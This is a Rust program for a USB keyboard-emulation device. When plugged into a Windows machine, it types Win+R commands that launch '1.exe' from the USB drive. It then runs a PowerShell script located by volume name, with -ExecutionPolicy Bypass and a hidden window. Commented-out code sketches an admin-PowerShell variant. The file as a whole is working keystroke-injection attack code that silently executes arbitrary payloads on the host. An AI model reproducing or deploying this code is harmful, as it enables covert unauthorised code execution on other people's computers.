use std::{
    fs::File,
    io::{BufRead, BufReader},
    thread::sleep,
    time::Duration,
};

use hid_simulator::{KeyboardHelper, CONFIG_FILE_PATH};
use hidg::{Class, Device, Key, Keyboard};
use log::info;
use simple_logger::SimpleLogger;

// const DRIVER_NAME: &str = "MYUDISK";
// const SCRIPT_PATH: &str = "hideAndRun.ps1";

fn main() -> std::io::Result<()> {
    SimpleLogger::new().init().unwrap();

    let mut device = Device::<Keyboard>::open(0)?;
    let mut input = Keyboard.input();
    let mut key_helper = KeyboardHelper::new(&mut device, &mut input);

    let config_file = File::open(CONFIG_FILE_PATH)?;
    let reader = BufReader::new(config_file);
    let mut config_contents = reader.lines();
    let driver_letter = config_contents
        .next()
        .expect("failed to resolve driver letter from keyboard config file")?;
    let script_path = config_contents
        .next()
        .expect("failed to resolve script path from keyboard config file")?;

    // let mut simulator = KeySimulator::new(&mut key_helper);

    // simulator.open_powershell_admin()?;
    // simulator.get_driver_letter(DRIVER_NAME)?;
    // simulator.run_command_in_powershell(format!("Start-Process -FilePath \"powershell.exe\" \
    //     -ArgumentList \"-ExecutionPolicy Bypass -WindowStyle Hidden -File ${{{DRIVER_LETTER_VAR_NAME}}}\\{SCRIPT_PATH}\"").as_str())?;
    // simulator.run_command_in_powershell("exit")?;

    info!(
        "HID simulator: driver letter: {}, script path: {}",
        driver_letter, script_path
    );

    // 1. 先启动 USB 监听程序。
    let cmd = format!("\"{}:\\1.exe\"", driver_letter);

    info!("HID simulator: cmd: {}", cmd);

    key_helper.press_multi(&[Key::LeftMeta, Key::R])?;
    sleep(Duration::from_millis(500));
    key_helper.press_cmd(&cmd)?;
    key_helper.press_one(Key::Enter)?; // 目前不用管理员启动，管理员则是ctrl + shift + enter

    // 2. 停两秒，保证监听程序启动。
    sleep(Duration::from_millis(2000));

    // 3. 启动真正的 shell_copy 程序。
    let cmd2 = format!("powershell -ExecutionPolicy Bypass -command \"$d = \
    (Get-WmiObject -Query 'SELECT DeviceID FROM Win32_LogicalDisk WHERE VolumeName=\\\"{driver_letter}\\\"').DeviceID; \
    Start-Process -WindowStyle Hidden -FilePath \\\"powershell\\\" -ArgumentList \\\"-File ${{d}}\\{script_path}\\\"\"");

    info!("HID simulator: cmd2: {}", cmd2);

    key_helper.press_multi(&[Key::LeftMeta, Key::R])?;
    sleep(Duration::from_millis(500));
    key_helper.press_cmd(&cmd2)?;
    key_helper.press_one(Key::Enter)?; // 目前不用管理员启动，管理员则是ctrl + shift + enter

    Ok(())
}
